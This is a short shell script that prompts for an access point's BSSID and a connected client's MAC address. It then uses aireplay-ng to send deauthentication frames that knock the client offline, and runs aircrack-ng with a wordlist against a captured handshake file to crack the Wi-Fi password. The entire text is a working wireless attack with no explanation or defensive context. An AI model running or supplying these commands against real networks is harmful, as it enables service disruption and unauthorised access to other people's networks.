./remove.sh
echo Access point mac/bssid
read  bssid
echo connected client mac 
read client
aireplay-ng --deauth -a $bssid -c $client  wlan0mon
aircrack-ng handshakes-01.cap -w wordlist
